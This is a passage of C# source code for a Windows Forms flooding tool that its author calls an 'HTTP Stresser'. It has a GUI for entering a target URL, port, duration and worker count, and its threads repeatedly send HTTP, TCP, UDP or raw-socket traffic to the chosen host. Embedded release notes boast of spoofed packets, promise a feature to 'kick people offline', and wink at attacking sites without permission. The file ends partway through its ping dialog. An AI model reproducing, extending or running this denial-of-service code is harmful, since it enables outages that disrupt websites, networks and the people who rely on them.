using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Net;
using System.Threading;
using System.Net.Http.Headers;
using System.Net.Http;
using System.Net.Sockets;
using System.Net.WebSockets;
using System.Net.NetworkInformation;
using System.Windows.Forms;
using System.Resources;
using System.Reflection;
using System.Runtime.InteropServices;

namespace src
{
    public partial class Main : Form
    {
        Tools tool = new Tools();
        Dash_Library Get = new Dash_Library();
        Control_Lib Misc = new Control_Lib();


        private struct Debug
        {
            public bool status;
            public int startuplog;
        };

        public void Boot() {
            this.Hide();

            /* Hello Future, add a splash screen here. */

            this.Show();
        }

        ToolTip tooltip = new ToolTip
        {
            UseAnimation = true,
            UseFading = true,
            ToolTipTitle = "Hey!"
        };


        private static String Send = String.Empty, Method = String.Empty, Type = String.Empty;
        private static Boolean timeout = false, IsRunning = false, SocketClient = false, UdpClient = false, TcpClient = false;//, Booted = false;

        private static int MethodType = 1, AttackType = 1, ExtendedMode = 0, Red = 32, Green = 32, Blue = 32;

        private Debug debug;
        private static ProtocolType SpecificProtocol;

        private PictureBox department = new PictureBox();
        private Panel Layer = new Panel();

        private static Label longsocks = new Label(), udpflood = new Label(), tcpoverload = new Label(), rawmeat = new Label(),
            title = new Label(), methodtitle = new Label(), typetitle = new Label(),
            url = new Label(), port = new Label(), useragent = new Label(), duration = new Label(), cookie = new Label(), workers = new Label(), data = new Label(),
            post = new Label(), get = new Label();

        private static Button methodPost = new Button(), methodGet = new Button(),
            typeLongSocks = new Button(), typeUdpFlood = new Button(), typeTcpOverload = new Button(), typeRawMeat = new Button(),
            UpdateLog = new Button(), ClearLog = new Button(), Ping = new Button(), Attack = new Button(), StopAttack = new Button(),
            quit = new Button(), minimize = new Button();

        private static TextBox Url = new TextBox(), Duration = new TextBox(), Port = new TextBox(), Cookie = new TextBox(), Workers = new TextBox(), Data = new TextBox(), Status = new TextBox(), UserAgent = new TextBox();

        public Main()
        {
            InitializeComponent();
            ResourceManager REGEX = new ResourceManager(("src.embeded"), Assembly.GetExecutingAssembly());


            this.Icon = (Icon)REGEX.GetObject("icon");
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormBorderStyle = FormBorderStyle.None;
            this.BackColor = Color.FromArgb(Red, Green, Blue);
            this.Height = 650;
            this.Text = "I ❤ D✿SH";


            tool.SetFormCursor(this, (Byte[])REGEX.GetObject("main"));

            Get.InjectInputBox(this, "", Status, 390, 178, 375, 450, 8, 48, 48, 48, 180, 180, 180);

            Status.VisibleChanged += (sender, argumentation) => {
                if (Status.Visible)
                {
                    Status.SelectionStart = Status.Text.Length;
                    Status.ScrollToCaret();
                }
            };

            Status.ScrollBars = ScrollBars.Vertical;
            Status.Multiline = true;
            Status.HideSelection = true;
            Status.AcceptsTab = true;
            Status.WordWrap = true;
            Status.ReadOnly = true;

            if (debug.startuplog == 0)
            {
                debug.startuplog = 1;
                Status.Text = StartLog();
            }

            department.MouseMove += (sentBy, msBeautiful) => { Misc.MiceMove(this, msBeautiful); };
            department.MouseDown += (sentBy, msBeautiful) => { Misc.MiceDown(msBeautiful); };

            debug.status = Get.InjectText(this, title, 0, 2, 285, 22, "(c) All Rights Reserved, Dashies Software Inc.", 8, 102, 35, 178, 255, 255, 255);
            if (debug.status != true) { Status.AppendText("* unable to add specific controls ;(\r\n* please restart this application, it may fix the issue.\r\n"); }

            debug.status = Get.InjectButton(this, quit, "X", this.Width - 74, 0, 74, 24, 10, 102, 35, 178, 255, 255, 255, 199, 105, 239, 255, 255, 255);
            if (debug.status != true) { Status.AppendText("* unable to add specific controls ;(\r\n* please restart this application, it may fix the issue.\r\n"); }

            debug.status = Get.InjectButton(this, minimize, "-", this.Width - 148, 0, 74, 24, 10, 102, 35, 178, 255, 255, 255, 199, 105, 239, 255, 255, 255);
            if (debug.status != true) { Status.AppendText("* unable to add specific controls ;(\r\n* please restart this application, it may fix the issue.\r\n"); }

            debug.status = Get.CreateMenu(this, 0, 0, this.Width, 24, department, ("profile"), 28, 24, 1, 102, 35, 178);
            if (debug.status != true) { Status.AppendText("* unable to add specific controls ;(\r\n* please restart this application, it may fix the issue.\r\n"); }

            Get.InjectInputBox(this, "http://www.google.co.uk", Url, 50, 65, 325, 28, 10, 18, 18, 18, 255, 255, 255);
            Get.InjectText(this, url, (Url.Left + Url.Width) + 15, Url.Top, 75, 25, "URL", 10, 28, 28, 28, 255, 255, 255);

            Get.InjectInputBox(this, "Cookie=8f75a1acb808d4f709bc4d71b9ab0343", Cookie, 50, 92, 325, 28, 10, 18, 18, 18, 255, 255, 255);
            Get.InjectText(this, cookie, (Url.Left + Url.Width) + 15, Cookie.Top, 125, 25, "Cookie(s)", 10, 28, 28, 28, 255, 255, 255);

            cookie.MouseHover += (sent, longsocks) =>
            {
               tooltip.Show("this only works for the method Long Socks :o", cookie, 0, 0, 6000);
            };

            Get.InjectInputBox(this, "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36", UserAgent, 50, 120, 325, 28, 10, 18, 18, 18, 255, 255, 255);
            Get.InjectText(this, useragent, (UserAgent.Left + UserAgent.Width) + 15, UserAgent.Top, 125, 25, "User-Agent", 10, 28, 28, 28, 255, 255, 255);

            useragent.MouseHover += (sent, longsocks) =>
            {
               tooltip.Show("this also only works for the method Long Socks :o", useragent, 0, 0, 6000);
            };

            Get.InjectInputBox(this, "f*ck with the best and die like the rest!", Data, 50, 148, 325, 28, 10, 18, 18, 18, 255, 255, 255);
            Get.InjectText(this, data, (Data.Left + Data.Width) + 15, Data.Top, 125, 25, "Packet Data", 10, 28, 28, 28, 255, 255, 255);

            data.MouseHover += (sent, longhighs) =>
            {
               tooltip.Show("this only works for the methods RAW, TCP and UDP.", data, 0, 0, 6000);
            };

            Get.InjectInputBox(this, "80", Port, 50, 341, 75, 28, 10, 18, 18, 18, 255, 255, 255);
            Get.InjectText(this, port, (Port.Left + Port.Width) + 15, Port.Top, 75, 25, "Port", 10, 28, 28, 28, 255, 255, 255);

            Get.InjectInputBox(this, "265", Duration, 50, 365, 75, 28, 10, 18, 18, 18, 255, 255, 255);
            Get.InjectText(this, duration, (Duration.Left + Duration.Width) + 15, Duration.Top, 75, 25, "Seconds (seconds)", 10, 28, 28, 28, 255, 255, 255);

            Get.InjectInputBox(this, "5", Workers, 50, 389, 75, 28, 10, 18, 18, 18, 255, 255, 255);
            Get.InjectText(this, workers, (Workers.Left + Workers.Width) + 15, Workers.Top, 75, 25, "Workers (processes)", 10, 28, 28, 28, 255, 255, 255);

            Get.InjectText(this, methodtitle, 225, 192, 150, 24, " Attack Methods :", 9, 28, 28, 28, 255, 255, 255);

            Get.InjectButton(this, methodPost, "✔", 225, 220, 19, 20, 9, 0, 55, 68, 255, 255, 255, 0, 55, 68, 255, 255, 255);
            Get.InjectText(this, post, (methodPost.Left + methodPost.Width) + 15, methodPost.Top, 200, 18, "HTTP(s) POST", 10, 28, 28, 28, 255, 255, 255);

            Get.InjectButton(this, methodGet, " ", 225, 242, 19, 20, 9, 0, 55, 68, 255, 255, 255, 0, 55, 68, 255, 255, 255);
            Get.InjectText(this, get, (methodGet.Left + methodGet.Width) + 15, methodGet.Top, 200, 18, "HTTP(s) GET", 10, 28, 28, 28, 255, 255, 255);

            Get.InjectText(this, typetitle, 50, 192, 150, 24, " Attack Types :", 9, 28, 28, 28, 255, 255, 255);

            Get.InjectButton(this, typeLongSocks, "✔", 50, 220, 19, 20, 9, 0, 55, 68, 255, 255, 255, 0, 55, 68, 255, 255, 255);
            Get.InjectText(this, longsocks, (typeLongSocks.Left + typeLongSocks.Width) + 15, typeLongSocks.Top, 200, 18, "Long Socks", 10, 28, 28, 28, 255, 255, 255);

            Get.InjectButton(this, typeUdpFlood, " ", 50, 242, 19, 20, 9, 0, 55, 68, 255, 255, 255, 0, 55, 68, 255, 255, 255);
            Get.InjectText(this, udpflood, (typeLongSocks.Left + typeLongSocks.Width) + 15, typeUdpFlood.Top, 200, 18, "UDP Juices", 10, 28, 28, 28, 255, 255, 255);

            Get.InjectButton(this, typeTcpOverload, " ", 50, 264, 19, 20, 9, 0, 55, 68, 255, 255, 255, 0, 55, 68, 255, 255, 255);
            Get.InjectText(this, tcpoverload, (typeLongSocks.Left + typeLongSocks.Width) + 15, typeTcpOverload.Top, 200, 18, "TCP Shits", 10, 28, 28, 28, 255, 255, 255);

            Get.InjectButton(this, typeRawMeat, " ", 50, 286, 19, 20, 9, 0, 55, 68, 255, 255, 255, 0, 55, 68, 255, 255, 255);
            Get.InjectText(this, rawmeat, (typeLongSocks.Left + typeLongSocks.Width) + 15, typeRawMeat.Top, 200, 18, "RAW Meat", 10, 28, 28, 28, 255, 255, 255);

            Get.InjectButton(this, Attack, "Start Attack", 50, 515, 120, 24, 10, 96, 0, 160, 255, 255, 255, 110, 0, 183, 255, 255, 255);
            Get.InjectButton(this, StopAttack, "Stop Attack", 185, 515, 120, 24, 10, 96, 0, 160, 255, 255, 255, 110, 0, 183, 255, 255, 255);

            Get.InjectButton(this, Ping, "Ping Target", 50, 549, 120, 24, 10, 96, 0, 160, 255, 255, 255, 110, 0, 183, 255, 255, 255);

            Get.InjectButton(this, UpdateLog, "Update Log", 50, 583, 120, 24, 10, 96, 0, 160, 255, 255, 255, 110, 0, 183, 255, 255, 255);
            Get.InjectButton(this, ClearLog, "Reset Log", 185, 583, 120, 24, 10, 96, 0, 160, 255, 255, 255, 110, 0, 183, 255, 255, 255);

            Get.InjectPanel(this, Layer, 35, 47, this.Width - 70, this.Height - 70, 28, 28, 28);

            UpdateLog.Click += (sentby, longsockgirl) =>
            {
                try
                {
                    Notification_UI Interface = new Notification_UI(1);
                    Interface.ShowDialog();
                }
                catch
                {
                    Status.AppendText("* apparently you are unable to open up our new dialog happening, oof.\r\n");
                }
            };

            Ping.Click += (sentby, msbeautiful) =>
            {
                if (FormatUrl(Url.Text) == true)
                {
                    Pawng ping = new Pawng(Url.Text);
                    ping.ShowDialog();
                    Url.Text = "http://www.google.com";
                }
            };

            StopAttack.Click += (sentby, thicc) =>
            {
                if (IsRunning == false)
                {
                    Status.AppendText("* the server is not even running, ahaha :o\r\n");
                }
                else
                {
                    Status.AppendText("* received your stop signal, this may take 5 seconds!\r\n");
                    
                    IsRunning = false;
                    timeout = true;
                    TcpClient = false;
                    UdpClient = false;
                    SocketClient = false;
                    
                    ExtendedMode = 0;

                }
            };

            Attack.Click += (sentby, msbeautiful) =>
            {
                if (IsRunning == true)
                {
                    Status.AppendText("* Ugh, you are already over running the server my lady.\r\n");
                }
                else
                {
                    if (FormatUrl(Url.Text) == true)
                    {
                        if((Duration.Text.Length <= 0) || (Url.Text.Length <= 0) || (Cookie.Text.Length <= 0) || (UserAgent.Text.Length <= 0) || (Workers.Text.Length <= 0) || (Port.Text.Length <= 0)) {
                            String insufficient = "insufficient input received";
                            List<TextBox> Simplified = new List<TextBox>();

                            Simplified.Add(Duration);
                            Simplified.Add(Workers);
                            Simplified.Add(Port);
                            Simplified.Add(Cookie);
                            Simplified.Add(UserAgent);
                            Simplified.Add(Data);

                            foreach(TextBox ID in Simplified)
                            {
                                tooltip.Show(insufficient, ID, 0, -0, 1000);
                            }
                        } else {
                            switch(MethodType)
                            {
                                case 1:
                                    {
                                        Method = "POST";
                                        break;
                                    }

                                case 2:
                                    {
                                        Method = "GET";
                                        break;
                                    }

                                default:
                                    {
                                        Method = "POST";
                                        MethodType = 1;
                                        break;
                                    }
                            }

                            switch(AttackType)
                            {
                                case 1:
                                    {
                                        SocketClient = true;
                                        Send =  $"{Method} / HTTP/1.1\r\n" +
                                                $"Host: {Url.Text.Replace("http://", "")}\r\n" +
                                                 "Connection: keep-alive\r\n" +
                                                 "Upgrade-Insecure-Requests: 1\r\n" +
                                                $"User-Agent: {UserAgent.Text}\r\n" + //Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36\r\n" +
                                                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n" +
                                                 "accept-encoding: gzip,deflate\r\n" +
                                                 "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.6,en;q=0.4\r\n" +
                                                $"Cookie: {Cookie.Text}; CAKEPHP=uglkh2asdasdassaadgksdjklgjklsdjklsdfhkljsfhjklfhsjklsfhjkljklsfhjklsfhjklfshjklfshjklsfhjklsfjklsfjklsfhkljhvkkslb4qevumf0pr4e4; _pk_id.2.9278=482ceb68ec2fb4f4.1481370495.1.1481371739.1481370495.; _pk_ses.2.9278=*\r\n\r\n";

                                        WarningMessage();
                                        Type = "LONG_SOCKS";
                                        break;
                                    }

                                case 2:
                                    {
                                        UdpClient = true;
                                        Send = Data.Text + "\r\n\r\n";
                                        WarningMessage();
                                        Type = "UDP_FLOOD";
                                        break;
                                    }

                                case 3:
                                    {
                                        TcpClient = true;
                                        Send = Data.Text + "\r\n\r\n";
                                        WarningMessage();
                                        Type = "TCP_OVERLOAD";
                                        break;
                                    }

                                case 4:
                                    {
                                        SocketClient = true;
                                        if(Data.Text.Length <= 0)
                                        {
                                            Data.Text = "Should have entered something .-.\r\n";
                                        }

                                        Send = Data.Text + "\r\n";
                                        ExtendedMode = 4;
                                        WarningMessage();

                                        Type = "RAW_MEAT";
                                        break;
                                    }

                                default:
                                    {
                                        Type = "LONG_SOCKS";
                                        break;
                                    }
                            }

                            IsRunning = true;
                            timeout = false;

                            Status.AppendText("* initializing Attack ....\r\n");
                                
                            for (int index = 0; index <= Convert.ToInt32(Workers.Text)-1; index += 1)
                            {
                                if(Type == "LONG_SOCKS")
                                {
                                    SpecificProtocol = ProtocolType.Tcp;
                                    Task RUN = Task.Run((Action)SyncASend);
                                } else
                                if(Type == "UDP_FLOOD")
                                {
                                    Task RUN = Task.Run((Action)SyncASend);
                                } else
                                if(Type == "TCP_OVERLOAD")
                                {
                                    Task RUN = Task.Run((Action)SyncASend);
                                } else
                                if(Type == "RAW_MEAT")
                                {
                                    SpecificProtocol = ProtocolType.Raw;
                                    Task RUN = Task.Run((Action)SyncASend);
                                } else
                                {
                                    SpecificProtocol = ProtocolType.Tcp;
                                    Task RUN = Task.Run((Action)SyncASend);
                                }

                                if(index == Convert.ToInt32(Workers.Text)-1) {
                                    Task duration = Task.Run((Action)TimeSpan);
                                }
                            }
                        }
                    }
                }
            };

            ClearLog.Click += (sentby, msbeautiful) =>
            {
                if(ClearLog.Text != StartLog()) {
                    Task RUN = Task.Run((Action)ClearLawg);
                }
            };

            Duration.TextChanged += (sent, mystical) =>
            {
                try
                {
                    if ((Duration.Text.All(char.IsDigit) != true) && (Workers.Text != ""))
                    {
                        tooltip.Show("only accepts numeric!", Duration, 0, -0, 1000);
                        Duration.Text = "265";
                    }
                }
                catch { }
            };

            Port.TextChanged += (sent, mystical) =>
            {
                try
                {
                    if ((Port.Text.All(char.IsDigit) != true) && (Port.Text != ""))
                    {
                        tooltip.Show("only accepts numeric!", Port, 0, -0, 1000);
                        Port.Text = "80";
                    } else
                    {
                        if ((Convert.ToInt32(Port.Text) > 8080) || (Convert.ToInt32(Port.Text) <= 0))
                        {
                            tooltip.Show("choose a port between 1-8080", Port, 0, -0, 1000);
                            Port.Text = "80";
                        }    
                    }
                }
                catch { }
            };

            Workers.TextChanged += (sent, mystical) =>
            {
                try
                {
                    if ((Workers.Text.All(char.IsDigit) != true) && (Workers.Text != ""))
                    {
                        tooltip.Show("only accepts numeric!", Workers, 0, -0, 1000);
                        Workers.Text = "5";
                    }
                    else if (Convert.ToInt32(Workers.Text) >= 150)
                    {
                        MessageBox.Show("You do know that this amount of processes can either crash your network or your device? just saying x)", "Lol");
                    }
                }
                catch { }
            };

            AttackType = 1;
            MethodType = 1;

            typeLongSocks.Click += (sentBy, thicc) =>
            {
                if(AttackType != 1)
                {
                    typeLongSocks.Text = "✔";
                    typeUdpFlood.Text = " ";
                    typeTcpOverload.Text = " ";
                    typeRawMeat.Text = " ";

                    AttackType = 1;
                }
            };

            typeUdpFlood.Click += (sentBy, leg) =>
            {
                if(AttackType != 2)
                {
                    typeLongSocks.Text = " ";
                    typeUdpFlood.Text = "✔";
                    typeTcpOverload.Text = " ";
                    typeRawMeat.Text = " ";

                    AttackType = 2;
                }
            };

            typeTcpOverload.Click += (sentBy, longsawks) =>
            {
                if(AttackType != 3)
                {
                    typeLongSocks.Text = " ";
                    typeUdpFlood.Text = " ";
                    typeTcpOverload.Text = "✔";
                    typeRawMeat.Text = " ";

                    AttackType = 3;
                }
            };

            typeRawMeat.Click += (sentBy, rawbeef) =>
            {
                if(AttackType != 4)
                {
                    typeLongSocks.Text = " ";
                    typeUdpFlood.Text = " ";
                    typeTcpOverload.Text = " ";
                    typeRawMeat.Text = "✔";

                    AttackType = 4;
                }
            };

            methodPost.Click += (sentBy, beautifulPony) =>
            {
                if (MethodType != 1)
                {
                    methodGet.Text = " ";
                    methodPost.Text = "✔";

                    MethodType = 1;
                }
            };

            methodGet.Click += (sentBy, beautifulPony) =>
            {
                if (MethodType != 2)
                {
                    methodGet.Text = "✔";
                    methodPost.Text = " ";

                    MethodType = 2;
                }
            };

            quit.Click += (sentBy, msValentine) => 
            {
                this.Close(); 
            };

            minimize.Click += (sentBy, msValentine) => {
                this.SendToBack();
            };
        }



        private void ClearLawg()
        {
            for(int index = 5; index >= 1; index -= 1)
            {
                Status.AppendText("clearing this log in [" + index.ToString() + "]\r\n");
                System.Threading.Thread.Sleep(1000);
            }

            Status.Text = StartLog();
        }




        private static void TimeSpan()
        {
            Status.AppendText("* attack has started successfully!\r\n");

            System.Threading.Thread.Sleep(Convert.ToInt32(Duration.Text) * 1000);

            IsRunning = false;
            timeout = true;
            TcpClient = false;
            UdpClient = false;
            SocketClient = false;
            ExtendedMode = 0;

            Status.AppendText("* attack has stopped successfully!\r\n");
        }



        private static void WarningMessage()
        {
            Status.AppendText("\r\n========================================================\r\n\r\n");
            Status.AppendText("* the following data will be used, please make sure it\r\n");
            Status.AppendText("* is correct as any mistakes can harm the applications\r\n");
            Status.AppendText("* performance horribly.\r\n\r\n");
            Status.AppendText("=====================================\r\n\r\n");
            Status.AppendText(Send);
            Status.AppendText("========================================================\r\n\r\n");
        }




        private static void SyncASend()
        {
            Socket Beef = new Socket(AddressFamily.InterNetwork, SocketType.Stream, SpecificProtocol);
            List<Socket> Beefies = new List<Socket>();
            Uri grabIp = new Uri(Url.Text);
            IPHostEntry entry;

            var ipResult = Dns.GetHostAddresses(grabIp.Host)[0];
            entry = Dns.GetHostEntry(ipResult);

            TcpClient TransmissionControlProtocol = new TcpClient(ipResult.ToString(), Convert.ToInt32(Port.Text));
            UdpClient UserDatagramProtocol = new UdpClient(ipResult.ToString(), Convert.ToInt32(Port.Text));

            var TcpWrite = TransmissionControlProtocol.GetStream();
            Byte[] DATA = Encoding.ASCII.GetBytes(Send);

            try
            {
                while (timeout == false)
                {
                    if(SocketClient == true) {
                        if(ExtendedMode == 4)
                        {
                            Beef = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IPv4);

                            Beef.Connect(entry.AddressList[0], Convert.ToInt32(Port.Text));
                            Beef.ReceiveTimeout = 0;
                            Beef.SendTimeout = 10;
                            Beef.Send(DATA);
                            Beef.Close();

                            Beefies.Add(Beef);
                        }

                        Beef = new Socket(AddressFamily.InterNetwork, SocketType.Stream, SpecificProtocol);

                        Beef.Connect(entry.AddressList[0], Convert.ToInt32(Port.Text));
                        Beef.ReceiveTimeout = 0;
                        Beef.SendTimeout = 10;
                        Beef.Send(DATA);
                        Beef.Close();

                        Beefies.Add(Beef);
                    } else
                    if(TcpClient == true)
                    {
                        TransmissionControlProtocol = new TcpClient(ipResult.ToString(), Convert.ToInt32(Port.Text));
                        TransmissionControlProtocol.ReceiveTimeout = 0;
                        TransmissionControlProtocol.SendTimeout = 10;

                        TcpWrite = TransmissionControlProtocol.GetStream();
                        TcpWrite.Write(DATA, 0, Send.Length);
                        TcpWrite.Close();
                        TcpWrite.Flush();

                        TransmissionControlProtocol.Close();
                    } else
                    if(UdpClient == true)
                    {
                        for(int index = 0; index <= 64; index += 1) {
                            UserDatagramProtocol = new UdpClient(ipResult.ToString(), Convert.ToInt32(Port.Text));
                            UserDatagramProtocol.Ttl = 10000;

                            UserDatagramProtocol.Connect(ipResult.ToString(), Convert.ToInt32(Port.Text));
                            UserDatagramProtocol.Send(DATA, Send.Length);
                            UserDatagramProtocol.Close();
                        }

                        System.Threading.Thread.Sleep(2000);
                    } else
                    {
                        Status.AppendText("* client not recognized, returning TcpClient instead!\r\n");
                        SocketClient = true;
                    }
                }
            }

            catch// (Exception E)
            {
                SyncASend();
            }

            finally
            {
                foreach (Socket ID in Beefies)
                {
                    ID.Dispose();
                }
            }
        }




        private Boolean FormatUrl(String uri)
        {
            if(uri.Length <= 0)
            {
                return false;
            }
            
            if ((uri.Contains("http://") != true) && (uri.Contains("https://") != true)) { tooltip.Show("only accepts HTTP Urls!", Url, 0, -0, 1000); return false; }

            try 
            { 
                Uri arwl = new Uri(uri);
                Dns.GetHostAddresses(arwl.Host);
            }
            catch 
            {
                tooltip.Show("host seems offline!", Url, 0, -0, 1000);
                return false;
            }

            return true;
        }

        private String StartLog()
        {
            return
                (
                  "~+=====================================================+~" + "\r\n" +
                  "|                                                       |" + "\r\n" +
                  "| Ugh, you are here again, yeet, i am not expecting you |" + "\r\n" +
                  "| to read all of this, but if you do, hang on, and read |" + "\r\n" +
                  "| the following lines, because they will tell you some  |" + "\r\n" +
                  "| things you may have missed, or things you do not know |" + "\r\n" +
                  "| about, and, ofcourse, the following lines will have   |" + "\r\n" +
                  "| some contents related to known bugs, and as usual i   |" + "\r\n" +
                  "| will be sure to talk a lot of none sense, not really  |" + "\r\n" +
                  "| but you get the idea, lol.                            |" + "\r\n" +
                  "|                                                       |" + "\r\n" +
                  "| okay, so let me start off with why reasoning for this |" + "\r\n" +
                  "| new release of this amazing application, so without   |" + "\r\n" +
                  "| any other none sense, i decided to bring 1.3 to you   |" + "\r\n" +
                  "| because i felt like giving you some new juicyness.    |" + "\r\n" +
                  "|                                                       |" + "\r\n" +
                  "| this update is gigantic compared to the other one and |" + "\r\n" +
                  "| can be considered an improvement update, a big lovely |" + "\r\n" +
                  "| one, because i have fixed a lot of issues, a lot of   |" + "\r\n" +
                  "| nasty ole buggies, and i have implemented a lot of    |" + "\r\n" +
                  "| functionality, such as options and functionality in   |" + "\r\n" +
                  "| general.                                              |" + "\r\n" +
                  "|                                                       |" + "\r\n" +
                  "| afterall, it comes down to you exploring this amazing |" + "\r\n" +
                  "| application yourself, if you think i am missing some  |" + "\r\n" +
                  "| type of functionality or if you think that you found  |" + "\r\n" +
                  "| some kind of bug, then please contact me using my     |" + "\r\n" +
                  "| email : Mystical_Cxder_Dashie@protonmail.com          |" + "\r\n" +
                  "|                                                       |" + "\r\n" +
                  "~+=====================================================+~" + "\r\n\r\n" +

                  "Dashies Software 2018 © All Rights Reserved.\r\n\r\n"
              );
        }
    }




    public partial class Notification_UI : Form
    {
        private Dash_Library toolset = new Dash_Library();
        private Tools tools = new Tools();

        private TextBox Log = new TextBox();
        private Button Quit = new Button();

        public String WhatIsNew()
        {
            return 
                (
                    "<[=====================================================]>" + "\r\n" +
                    " |                                                     |" + "\r\n" +
                    " | what is actually new in the update that i have put  |" + "\r\n" +
                    " | put out, what is new in update 1.3, the yet biggest |" + "\r\n" +
                    " | performance update for the Dashies HTTP Stresser    |" + "\r\n" +
                    " | Series, well, let me tell you exactly what is new.  |" + "\r\n" +
                    " |                                                     |" + "\r\n" +
                    " | well, the things that matter then, too lazy to type |" + "\r\n" +
                    " | all the little codes and such that i have improved  |" + "\r\n" +
                    " | ugh, well, anyways.                                 |" + "\r\n" +
                    " |                                                     |" + "\r\n" +
                    " | this improvement update focuses on layout and       |" + "\r\n" +
                    " | flexibility, i have managed to add in a few extra   |" + "\r\n" +
                    " | attack types and methods, some hover tags, this     |" + "\r\n" +
                    " | dialog, some extra buttons, new text, grammar fixes |" + "\r\n" +
                    " | , code optimizations, code extensions, data input   |" + "\r\n" +
                    " | boxes, ping fixes, better text, spoofed packets     |" + "\r\n" +
                    " | (not fully spoofed, just partly), improved header   |" + "\r\n" +
                    " | requests, anti-empty-submittion, bug fixes, and a   |" + "\r\n" +
                    " | shit fucking ton of other shit. lol.                |" + "\r\n" +
                    " |                                                     |" + "\r\n" +
                    " | even tho i am not really the type to spoil 1.4 i am |" + "\r\n" +
                    " | still going to do it, 1.4 will come with an         |" + "\r\n" +
                    " | improved user interface, more options, more attack  |" + "\r\n" +
                    " | types and methods, more colours, more ponies, more  |" + "\r\n" +
                    " | none sense, a port scanner, fully spoofed headers   |" + "\r\n" +
                    " | , ms spoofing, improved pinger and as last but not  |" + "\r\n" +
                    " | least, the ability to kick people offline ^-^       |" + "\r\n" +
                    " |                                                     |" + "\r\n" +
                    " | even tho you all are script lords, i do not fucking |" + "\r\n" +
                    " | care, i wrote this entire thing using C# and my own |" + "\r\n" +
                    " | modified version of the .NET Framework 4.7 to be    |" + "\r\n" +
                    " | exact.                                              |" + "\r\n" +
                    " |                                                     |" + "\r\n" +
                    " | oof, just know that thing actually works and does   |" + "\r\n" +
                    " | what it should, know that i am just bored and thus  |" + "\r\n" +
                    " | create such application like this, i have a lot     |" + "\r\n" +
                    " | more ideas to code so stay up.                      |" + "\r\n" +
                    " |                                                     |" + "\r\n" +
                    " | also, i know you are most likely in need of more    |" + "\r\n" +
                    " | power if the methods are effectiveless against your |" + "\r\n" +
                    " | target, because either the required port is not     |" + "\r\n" +
                    " | open, the firewall is blocking all packets, your    |" + "\r\n" +
                    " | network limits your bandwidth, the method is        |" + "\r\n" +
                    " | being used wrongly (keep that all in mind), i would |" + "\r\n" +
                    " | not recommend pushing the workers above 150 because |" + "\r\n" +
                    " | they may crash either your cpu, internet connection |" + "\r\n" +
                    " | or the damn application itself, so be wise.         |" + "\r\n" +
                    " |                                                     |" + "\r\n" +
                    " | and before i leave, do not attack websites without  |" + "\r\n" +
                    " | the permission to do so unless you are a 99% sure   |" + "\r\n" +
                    " | that your connection is being spoofed, lol.         |" + "\r\n" +
                    " |                                                     |" + "\r\n" +
                    " | - Dashie                                            |" + "\r\n" +
                    " |                                                     |" + "\r\n" +
                    "<[=====================================================]>" + "\r\n"
                );
        }

        public Notification_UI(int Id)
        {
            try
            {
                if(InitializeNotificationUI() == false)
                {
                    MessageBox.Show("we were unable to initialize the dialog that you requested, please report this bug to the developers as this is something that should not happen. sorry!", "FATAL ERROR");
                    this.Close();
                } else
                {
                    toolset.InjectInputBox(this, "", Log, 0, 21, this.Width, this.Height - 21, 9, 22, 22, 22, 200, 200, 200);
                    Log.VisibleChanged += (sender, argumentation) =>
                    {
                        if (Log.Visible)
                        {
                            Log.SelectionStart = Log.Text.Length;
                            Log.ScrollToCaret();
                        }
                    };

                    Log.ScrollBars = ScrollBars.Vertical;
                    Log.Multiline = true;
                    Log.HideSelection = true;
                    Log.AcceptsTab = true;
                    Log.WordWrap = true;
                    Log.ReadOnly = true;

                    toolset.InjectButton(this, Quit, "X", this.Width - 74, -3, 74, 24, 12, 16, 16, 16, 255, 255, 255, 24, 24, 24, 255, 255, 255);
                    Quit.Click += (sent, MsThiccLeg) => 
                    {
                        this.Close();  
                    };

                    switch(Id)
                    {
                        case 1:
                            {
                                Log.AppendText(WhatIsNew());
                                break;
                            }

                        default:
                            {
                                Log.AppendText("* unrecognized id received for text display ;(");
                                break;
                            }
                    }
                }
            }
            catch
            {
                Log.AppendText("* Well, that is unfortunate, we were unable to load the update log ;(");
                Log.AppendText("* Please try again c:");
            }
        }

        private Boolean InitializeNotificationUI()
        {
            this.Size = new Size(425, 500);
            if(this.Size != new Size(425, 500))
            {
                return false;
            }

            ResourceManager Addr = new ResourceManager(("src.embeded"), Assembly.GetExecutingAssembly());
            tools.SetFormCursor(this, (Byte[])Addr.GetObject("main"));

            this.Text = "Ʊ";
            this.Icon = (Icon)Addr.GetObject("icon");

            this.FormBorderStyle = FormBorderStyle.None;
            this.StartPosition = FormStartPosition.CenterParent;

            this.BackColor = Color.FromArgb(16, 16, 16);
            this.ForeColor = Color.FromArgb(255, 255, 255);

            return true;
        }
    }




    public class Pawng : Form
    {
        private Tools tool = new Tools();
        private Dash_Library get = new Dash_Library();
        private Button quit = new Button();
        public static TextBox Status = new TextBox();
        public static String target = String.Empty, url = String.Empty;
        public static Boolean IsPinging = false;

        public Pawng(String Target)
        {
            ResourceManager REGEX = new ResourceManager(("src.embeded"), Assembly.GetExecutingAssembly());

            this.StartPosition = FormStartPosition.CenterParent;
            this.FormBorderStyle = FormBorderStyle.None;

            tool.SetFormCursor(this, (Byte[])REGEX.GetObject("main"));

            this.BackColor = Color.FromArgb(16, 16, 16);
            this.ForeColor = Color.FromArgb(255, 255, 255);

            this.Text = "Ʊ";
            this.Icon = (Icon)REGEX.GetObject("icon");
            this.Size = new Size(500, 300);
            this.Font = new Font("Consolas", 10);

            get.InjectInputBox(this, "", Status, 0, 21, this.Width, this.Height - 21, 9, 22, 22, 22, 200, 200, 200);

            Status.VisibleChanged += (sender, argumentation) => {
                if (Status.Visible)
                {
                    Status.SelectionStart = Status.Text.Length;
                    Status.ScrollToCaret();
                }
            };

            Status.ScrollBars = ScrollBars.Vertical;
            Status.Multiline = true;
            Status.HideSelection = true;
            Status.AcceptsTab = true;
            Status.WordWrap = true;
            Status.ReadOnly = true;

